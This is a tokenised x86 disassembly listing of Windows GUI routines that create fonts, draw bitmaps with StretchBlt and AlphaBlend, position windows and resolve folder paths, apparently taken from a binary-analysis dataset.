test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
pop edi
test eax eax
je r-xdata
push eax
call esi
pop esi
jmp sub_420d30
push eax
call esi
sub_420bc0
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5c ] eax
xor eax eax
push 0x11
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] rw-data
call [ GetStockObject@IAT ]
lea ecx [ esp ]
push ecx
push 0x5c
push eax
call [ GetObjectW@IAT ]
call [ GetVersion@IAT ]
movzx ecx al
cmp eax 0x80000000
jae r-xdata
mov eax 0x7ffffffe
mov ecx 0x20
lea edx [ esp + 0x1c ]
cmp ecx 0x5
je r-xdata
cmp ecx 0x6
mov eax 0x7ffffffe
lea edx [ esp + 0x1c ]
mov ecx 0x20
jne r-xdata
push r--data
push r--data
jmp r-xdata
call sub_421180
push esi
mov esi [ CreateFontIndirectW@IAT ]
push edi
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0xc ] 0xfffffff5
call esi
mov [ rw-data ] eax
lea eax [ esp + 0x8 ]
mov edi 0x2bc
push eax
mov [ esp + 0x1c ] edi
call esi
lea ecx [ esp + 0x8 ]
push ecx
mov [ rw-data ] eax
mov [ esp + 0x1c ] 0x190
mov [ esp + 0xc ] 0xfffffff4
call esi
lea edx [ esp + 0x8 ]
push edx
mov [ rw-data ] eax
mov [ esp + 0x1c ] edi
call esi
mov [ rw-data ] eax
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0x1c ] 0x190
mov [ esp + 0xc ] 0xfffffff3
call esi
lea ecx [ esp + 0x8 ]
push ecx
mov [ rw-data ] eax
mov [ esp + 0x1c ] edi
call esi
lea edx [ esp + 0x8 ]
push edx
mov [ rw-data ] eax
mov [ esp + 0x1c ] 0x190
mov [ esp + 0xc ] 0xfffffff0
call esi
mov [ rw-data ] eax
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0x1c ] edi
call esi
mov ecx [ esp + 0x64 ]
pop edi
pop esi
mov [ rw-data ] eax
xor ecx esp
mov eax rw-data
call sub_43f96b
add esp 0x60
retn
sub_420d30
mov eax [ rw-data ]
push esi
mov esi [ DeleteObject@IAT ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] edi
pop edi
pop esi
retn
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
sub_420df0
sub esp 0x8
push ebx
push ebp
push esi
mov ebp ecx
push edi
mov edi ebp
call sub_4230c0
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push eax
push ecx
call [ SelectObject@IAT ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x1c ]
mov edx [ esp + 0x24 ]
mov edi [ rw-data ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
mov esi eax
imul esi [ esp + 0x2c ]
push ecx
sub ebx ecx
mov ecx [ esp + 0x20 ]
sub ebx eax
mov eax [ esp + 0x24 ]
add ebx [ esp + 0x2c ]
push edx
push eax
mov eax [ ebp + 0x10 ]
push ecx
push ebp
xor edx edx
mov [ esp + 0x24 ] esi
mov [ esp + 0x40 ] ebx
call sub_4232d0
mov edi [ ebp + 0x18 ]
add edi [ esp + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
mov edx [ esp + 0x24 ]
sub ecx eax
push ecx
push edx
add esi eax
mov eax [ esp + 0x24 ]
push edi
mov edi [ rw-data ]
push eax
mov eax [ ebp + 0x10 ]
push ebp
xor edx edx
call sub_4232d0
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
push ecx
push edx
call [ SelectObject@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x14
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x1c ]
push eax
push 0x0
sub ebx ecx
mov edx esi
mov esi [ esp + 0x24 ]
add ecx edx
mov edx [ esp + 0x34 ]
push ecx
mov ecx [ rw-data ]
push ecx
push eax
mov eax [ esp + 0x38 ]
push edx
push eax
push edi
mov ecx ebp
call sub_421250
add edi [ esp + 0x2c ]
mov esi [ esp + 0x10 ]
sub_420ee0
sub esp 0x8
push ebx
push ebp
push esi
mov ebp ecx
push edi
mov edi ebp
call sub_4230c0
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push eax
push ecx
call [ SelectObject@IAT ]
mov edi [ esp + 0x1c ]
push 0x4
push edi
mov [ esp + 0x1c ] eax
call [ SetStretchBltMode@IAT ]
mov edx [ ebp + 0x18 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x1c ]
mov ebx [ esp + 0x2c ]
sub ebx [ ebp + 0x10 ]
sub eax edx
sub eax ecx
add eax [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
mov esi ecx
imul esi [ esp + 0x34 ]
mov ecx [ esp + 0x24 ]
push edx
mov [ esp + 0x38 ] eax
mov eax [ ebp + 0x20 ]
push ecx
sub ebx eax
add ebx [ ebp + 0x24 ]
push edi
mov edi [ rw-data ]
push ebp
xor edx edx
mov [ esp + 0x24 ] esi
mov [ esp + 0x3c ] ebx
call sub_4232d0
mov edi [ ebp + 0x18 ]
add edi [ esp + 0x20 ]
cmp [ esp + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0xc ]
mov ecx [ esp + 0x10 ]
sub edx eax
push edx
lea esi [ eax + ecx ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
push eax
mov eax [ ebp + 0x20 ]
push edi
mov edi [ rw-data ]
push ecx
push ebp
xor edx edx
call sub_4232d0
mov edi [ ebp + 0x20 ]
add edi [ esp + 0x24 ]
mov [ esp + 0x24 ] edi
test ebx ebx
je r-xdata
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x1c ]
push eax
push 0x0
sub ebx ecx
mov edx esi
mov esi [ esp + 0x24 ]
add ecx edx
mov edx [ esp + 0x38 ]
push ecx
mov ecx [ rw-data ]
push ecx
push eax
mov eax [ esp + 0x38 ]
push edx
push eax
push edi
mov ecx ebp
call sub_421250
add edi [ esp + 0x30 ]
mov ebx [ esp + 0x28 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ esp + 0x20 ]
mov edx [ ebp + 0x24 ]
mov eax [ ebp + 0x10 ]
mov esi [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x20 ]
push edi
mov edi [ rw-data ]
push ebx
push ecx
sub eax edx
push ebp
call sub_4232d0
mov edi [ ebp + 0x18 ]
add edi ebx
cmp [ esp + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x24 ]
mov ecx [ ebp + 0x18 ]
mov esi [ esp + 0x1c ]
sub edx eax
push edx
mov edx [ rw-data ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x2c ]
push edx
push ebx
push ecx
push edi
mov ebx ecx
push eax
mov ecx ebp
call sub_421250
mov eax [ ebp + 0x18 ]
add eax [ esp + 0x20 ]
cmp [ esp + 0x30 ] 0x0
mov [ esp + 0x24 ] eax
je r-xdata
mov ecx [ ebp + 0x1c ]
mov ebx [ ebp + 0xc ]
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x24 ]
lea esi [ ecx + eax ]
mov eax [ ebp + 0x10 ]
sub ebx ecx
mov ecx [ esp + 0x24 ]
push ebx
push ecx
mov ecx [ esp + 0x24 ]
push edi
mov edi [ rw-data ]
push ecx
sub eax edx
push ebp
call sub_4232d0
mov edx [ esp + 0x14 ]
mov eax [ rw-data ]
push edx
push eax
call [ SelectObject@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x18
mov ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x18 ]
mov ebx [ ebp + 0x1c ]
sub eax ecx
push eax
push ecx
mov ecx esi
mov esi [ esp + 0x24 ]
sub ebx edx
add edx ecx
mov ecx [ esp + 0x2c ]
push edx
mov edx [ rw-data ]
push edx
push eax
mov eax [ esp + 0x44 ]
push eax
push ecx
push edi
mov ecx ebp
call sub_421250
add edi [ esp + 0x30 ]
mov edx [ ebp + 0x1c ]
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x20 ]
sub ebx edx
mov edx [ ebp + 0x24 ]
sub edx ecx
push edx
mov edx [ esp + 0x14 ]
push ecx
mov ecx [ ebp + 0x1c ]
add ecx edx
mov edx [ esp + 0x30 ]
push ecx
mov ecx [ rw-data ]
push ecx
push edx
push ebx
push edi
push eax
mov ecx ebp
call sub_421250
add edi [ esp + 0x28 ]
mov [ esp + 0x24 ] edi
mov ecx [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
mov edx [ ebp + 0x18 ]
sub ebx ecx
push ebx
mov ebx [ ebp + 0x1c ]
push ecx
mov ecx [ esp + 0x18 ]
sub ebx edx
add edx ecx
mov ecx [ esp + 0x30 ]
push edx
mov edx [ rw-data ]
push edx
mov edx [ esp + 0x40 ]
push ecx
push edx
push edi
push eax
mov ecx ebp
call sub_421250
mov eax [ esp + 0x30 ]
add [ esp + 0x24 ] eax
mov eax [ esp + 0x24 ]
sub_421180
push ebx
push esi
mov ebx eax
xor eax eax
push edi
mov edi [ esp + 0x10 ]
test ecx ecx
je r-xdata
sub edx 0x2
mov eax 0x8007007a
nop
test ecx ecx
jne r-xdata
movzx esi [ edi ]
test si si
je r-xdata
pop edi
xor ecx ecx
pop esi
mov [ edx ] cx
pop ebx
retn 0x4
mov [ edx ] si
dec ecx
add edx 0x2
add edi 0x2
dec ebx
test ecx ecx
jne r-xdata
test ebx ebx
je r-xdata
pop edi
sub edx 0x2
pop esi
mov eax 0x8007007a
mov [ edx ] cx
pop ebx
retn 0x4
sub_4211e0
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
call sub_4230c0
mov eax [ edi + 0x8 ]
mov ecx [ rw-data ]
mov ebp [ SelectObject@IAT ]
push eax
push ecx
call ebp
mov ebx [ edi + 0xc ]
mov edx [ edi + 0x10 ]
mov ecx [ rw-data ]
mov esi [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
push edx
mov edx [ esp + 0x2c ]
mov eax ebx
imul eax [ esp + 0x30 ]
push 0x0
push eax
mov eax [ esp + 0x30 ]
push ecx
mov ecx [ esp + 0x30 ]
push edx
mov edx [ esp + 0x30 ]
push eax
push ecx
push edx
mov ecx edi
call sub_421250
mov eax [ esp + 0x10 ]
mov ecx [ rw-data ]
push eax
push ecx
call ebp
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x18
sub_421250
push ebp
mov ebp [ esp + 0x20 ]
xor al al
push edi
mov edi [ esp + 0x28 ]
cmp [ ecx + 0x16 ] al
je r-xdata
push 0x4
push esi
call [ SetStretchBltMode@IAT ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push 0xcc0020
push edi
push ebx
push ebp
push eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push edx
push esi
call [ StretchBlt@IAT ]
pop edi
pop ebp
retn 0x20
mov ecx [ esp + 0x1c ]
mov [ esp + 0x28 ] al
mov [ esp + 0x29 ] al
mov eax [ esp + 0x20 ]
mov [ esp + 0x2a ] 0xff
mov [ esp + 0x2b ] 0x1
mov edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x1c ]
push edi
push ebx
push ebp
push eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push edx
push esi
call [ AlphaBlend@IAT ]
pop edi
pop ebp
retn 0x20
sub_4212e0
push ecx
push ebx
push ebp
push esi
push edi
mov edi ecx
call sub_4230c0
mov eax [ edi + 0x8 ]
mov ecx [ rw-data ]
mov ebp [ SelectObject@IAT ]
push eax
push ecx
call ebp
mov ebx [ edi + 0xc ]
mov ecx [ rw-data ]
mov esi [ esp + 0x18 ]
mov edx ebx
imul edx [ esp + 0x28 ]
mov [ esp + 0x10 ] eax
mov eax [ edi + 0x10 ]
push eax
push 0x0
push edx
mov edx [ esp + 0x30 ]
push ecx
mov ecx [ esp + 0x2c ]
push eax
mov eax [ esp + 0x34 ]
push edx
push eax
push ecx
mov ecx edi
call sub_421250
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
push edx
push eax
call ebp
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x14
sub_421350
push 0xffffffff
push sub_45938f
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xbc ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd4 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x14 ] rw-data
call sub_420bc0
xor ebx ebx
mov [ esp + 0xdc ] ebx
mov eax 0x1
mov [ rw-data ] ax
mov eax 0x3
mov ecx r--data
mov [ rw-data ] 0xc8
mov [ rw-data ] ebx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] ecx
mov [ rw-data ] 0x2
mov [ rw-data ] eax
mov edx 0x1
mov [ rw-data ] 0xc9
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] ecx
mov [ rw-data ] 0x4
mov [ rw-data ] 0xe
mov esi r--data
mov ecx edx
mov [ rw-data ] esi
mov [ rw-data ] 0xca
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xce
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xd2
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xd1
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xd0
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xcb
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov ecx eax
mov [ rw-data ] esi
mov [ rw-data ] 0xcc
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xcd
mov edx eax
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xcf
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xd3
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov ecx 0x1
mov [ rw-data ] 0xd4
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] r--data
mov [ rw-data ] 0x9
mov [ rw-data ] 0x12
mov [ rw-data ] 0x28
mov [ rw-data ] 0x2d
mov [ rw-data ] esi
mov [ rw-data ] 0xd5
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov ecx eax
mov [ rw-data ] esi
mov [ rw-data ] 0xd6
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov edx 0x1
mov [ rw-data ] esi
mov [ rw-data ] 0xd7
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov ecx edx
mov [ rw-data ] esi
mov [ rw-data ] 0xd8
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] bl
mov [ rw-data ] esi
mov [ rw-data ] 0xd9
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov ecx eax
mov [ rw-data ] esi
mov [ rw-data ] 0xda
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xdb
mov [ rw-data ] ebx
mov edx eax
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] esi
mov [ rw-data ] 0xe7
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov edx 0x1
mov [ rw-data ] esi
mov [ rw-data ] 0xe8
mov [ rw-data ] ebx
mov [ rw-data ] dx
mov [ rw-data ] bl
mov [ rw-data ] al
mov ecx edx
mov [ rw-data ] esi
mov [ rw-data ] 0xe9
mov [ rw-data ] ebx
mov [ rw-data ] cx
mov [ rw-data ] bl
mov [ rw-data ] al
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ esp + 0xdc ] 0x19
mov edi [ GetStockObject@IAT ]
push 0x11
call edi
mov ebp [ GetObjectW@IAT ]
lea edx [ esp + 0x18 ]
push edx
push 0x5c
push eax
call ebp
push r--data
mov eax 0x7ffffffe
lea ecx [ ebx + 0x20 ]
lea edx [ esp + 0x38 ]
call sub_421180
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0x2c ] 0x190
mov [ esp + 0x1c ] 0xffffffea
call [ CreateFontIndirectW@IAT ]
push 0x11
mov [ rw-data ] eax
call edi
lea ecx [ esp + 0x74 ]
push ecx
push 0x5c
push eax
call ebp
push r--data
mov eax 0x7ffffffe
lea ecx [ ebx + 0x20 ]
lea edx [ esp + 0x94 ]
call sub_421180
lea edx [ esp + 0x74 ]
push edx
mov [ esp + 0x88 ] 0x190
mov [ esp + 0x78 ] 0xffffffee
call [ CreateFontIndirectW@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0xd8
push eax
call [ LoadIconW@IAT ]
push 0x18
mov edi eax
call sub_43fa1d
add esp 0x4
cmp eax ebx
je r-xdata
mov [ rw-data ] ebx
mov ecx 0x1
mov [ eax + 0x14 ] cx
mov [ eax + 0x16 ] cl
mov ecx 0x10
mov [ eax ] esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x17 ] bl
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
mov ecx [ esp + 0xd4 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xbc ]
xor ecx esp
call sub_43f96b
add esp 0xcc
retn
sub_4218f0
sub esp 0x58
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x6c ]
mov eax [ edi ]
push 0xfffffff0
push eax
call [ GetWindowLongW@IAT ]
mov ebp [ GetParent@IAT ]
mov ebx eax
and ebx 0x40000000
je r-xdata
mov edx [ edi ]
push 0x4
push edx
call [ GetWindow@IAT ]
mov ecx [ edi ]
push ecx
call ebp
jmp r-xdata
mov eax [ edi ]
push eax
call ebp
mov ebx [ GetClientRect@IAT ]
lea ecx [ esp + 0x20 ]
mov edi eax
push ecx
push edi
call ebx
lea edx [ esp + 0x10 ]
push edx
push esi
call ebx
push 0x2
lea eax [ esp + 0x14 ]
push eax
push edi
push esi
call [ MapWindowPoints@IAT ]
test esi esi
je r-xdata
mov ecx [ edi ]
mov esi eax
lea eax [ esp + 0x30 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
test ebx ebx
jne r-xdata
mov eax [ esp + 0x20 ]
cmp ecx eax
jge r-xdata
sub ebp esi
mov ecx ebp
mov edx [ edi ]
push 0x2
push edx
push 0xfffffff0
push esi
call [ GetWindowLongW@IAT ]
test eax 0x10000000
je r-xdata
mov eax [ esp + 0x2c ]
lea edx [ edi + ebx ]
cmp edx eax
jle r-xdata
mov ecx eax
lea ecx [ esp + 0x40 ]
push ecx
push eax
mov [ esp + 0x48 ] 0x28
call [ GetMonitorInfoW@IAT ]
test eax eax
je r-xdata
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x58
retn 0x4
xor esi esi
test eax 0x20000000
je r-xdata
mov eax [ esp + 0x24 ]
cmp edi eax
jge r-xdata
sub eax ebx
mov edi eax
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x58 ]
mov ebp [ esp + 0x5c ]
mov edx [ esp + 0x60 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] ebp
mov [ esp + 0x2c ] edx
test esi esi
jne r-xdata
push 0x2
push esi
jmp r-xdata
mov eax [ esp + 0x6c ]
push 0x15
push 0xffffffff
push 0xffffffff
push edi
push ecx
mov ecx [ eax ]
push 0x0
push ecx
call [ SetWindowPos@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x58
retn 0x4
mov edi eax
lea edx [ esp + 0x10 ]
push edx
push esi
call [ GetWindowRect@IAT ]
jmp r-xdata
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] edx
jmp r-xdata
call [ MonitorFromWindow@IAT ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x28 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov esi [ esp + 0x38 ]
sub esi [ esp + 0x30 ]
mov ebx [ esp + 0x3c ]
sub ebx [ esp + 0x34 ]
lea eax [ ecx + edx ]
cdq
sub eax edx
mov ecx eax
mov eax esi
cdq
sub eax edx
mov edx [ esp + 0x14 ]
sar eax 0x1
sar ecx 0x1
sub ecx eax
mov eax [ esp + 0x1c ]
add eax edx
cdq
sub eax edx
mov edi eax
mov eax ebx
cdq
sub eax edx
sar eax 0x1
sar edi 0x1
sub edi eax
lea eax [ ecx + esi ]
cmp eax ebp
jle r-xdata
sub_421aa0
cmp ecx 0x1
jne r-xdata
cmp [ edx + 0x18 ] 0x8
jb r-xdata
cmp [ edx + 0x18 ] 0x8
jb r-xdata
add edx 0x4
mov edx [ edx + 0x4 ]
jmp r-xdata
add edx 0x4
mov [ edx + esi * 2 ] ax
retn
mov edx [ edx + 0x4 ]
mov [ edx + esi * 2 ] ax
retn
pop edi
retn
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
push edi
lea edi [ edx + esi * 2 ]
test ecx ecx
jbe r-xdata
sub_421af0
push esi
mov esi eax
or eax 0xffffffff
sub eax [ ebx + 0x14 ]
cmp eax esi
ja r-xdata
mov eax ebx
test esi esi
jbe r-xdata
call sub_43f0d9
pop esi
retn 0x4
push edi
mov edi [ ebx + 0x14 ]
add edi esi
call sub_429c60
test al al
je r-xdata
mov eax ebx
pop edi
mov eax [ esp + 0xc ]
mov ecx esi
mov esi [ ebx + 0x14 ]
mov edx ebx
call sub_421aa0
cmp [ ebx + 0x18 ] 0x8
mov [ ebx + 0x14 ] edi
jb r-xdata
lea eax [ ebx + 0x4 ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ ebx + 0x4 ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax ebx
pop esi
retn 0x4
sub_421b50
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax 0x1
ja r-xdata
push edi
mov edi [ esi + 0x14 ]
inc edi
mov eax esi
call sub_429c60
test al al
je r-xdata
call sub_43f0d9
mov eax esi
pop edi
retn
cmp [ esi + 0x18 ] 0x8
mov edx [ esi + 0x14 ]
lea eax [ esi + 0x4 ]
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ eax ]
push ebp
mov ebp 0x5c
mov [ ecx + edx * 2 ] bp
cmp [ esi + 0x18 ] 0x8
mov [ esi + 0x14 ] edi
pop ebp
jb r-xdata
sub_421bb0
sub esp 0x414
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x410 ] eax
push ebp
push esi
push edi
xor eax eax
push 0x206
push eax
lea ecx [ esp + 0x16 ]
push ecx
mov [ esp + 0x18 ] ax
call sub_443360
add esp 0xc
lea edx [ esp + 0xc ]
push edx
push 0x0
push 0x0
push 0x801a
push 0x0
call [ SHGetFolderPathW@IAT ]
test eax eax
jl r-xdata
xor eax eax
push 0x206
push eax
lea ecx [ esp + 0x21e ]
push ecx
mov [ esp + 0x220 ] ax
call sub_443360
add esp 0xc
push 0x104
lea edx [ esp + 0x218 ]
push edx
push r--data
call [ ExpandEnvironmentStringsW@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
lea eax [ esp + 0xc ]
lea edx [ eax + 0x2 ]
cmp ebp 0x104
jb r-xdata
pop edi
pop esi
xor al al
pop ebp
mov ecx [ esp + 0x410 ]
xor ecx esp
call sub_43f96b
add esp 0x414
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x10 ]
mov esi ebx
call sub_429cc0
jmp r-xdata
push ebx
lea eax [ esp + 0x218 ]
call sub_429d70
xor ecx ecx
lea esi [ ebp + 0x1 ]
mov eax esi
mov edx 0x2
mul edx
seto cl
push rw-data
neg ecx
or ecx eax
push ecx
call sub_440cc4
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov eax [ ebx + 0x14 ]
lea esi [ eax - 0x1 ]
cmp esi eax
jbe r-xdata
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
call sub_4407b7
lea eax [ ebp + ebp + 0x2 ]
push eax
push 0x0
push edi
call sub_443360
add esp 0xc
push esi
push edi
push r--data
call [ ExpandEnvironmentStringsW@IAT ]
push ebx
mov eax edi
call sub_429d70
push edi
call sub_43f97a
add esp 0x4
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x41c ]
pop edi
pop esi
pop ebp
xor ecx esp
mov al 0x1
call sub_43f96b
add esp 0x414
retn
mov esi ebx
call sub_421b50
cmp [ eax + esi * 2 ] 0x5c
je r-xdata
sub_421d30
push 0xffffffff
push sub_45a96b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x820
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x81c ] eax
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x830 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x840 ]
xor eax eax
xor ebx ebx
mov [ esp + 0x14 ] ax
push ebx
mov eax r--data
lea esi [ esp + 0x14 ]
mov [ esp + 0x2c ] 0x7
mov [ esp + 0x28 ] ebx
call sub_429cc0
push ebx
mov eax r--data
mov esi edi
mov [ esp + 0x83c ] ebx
call sub_429cc0
push ebx
mov eax r--data
lea esi [ esp + 0x14 ]
call sub_429cc0
mov ebx esi
call sub_421bb0
test al al
je r-xdata
or esi 0xffffffff
cmp [ esp + 0x28 ] 0x8
jb r-xdata
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ esp + 0x14 ]
push eax
call sub_43f960
add esp 0x4
mov eax esi
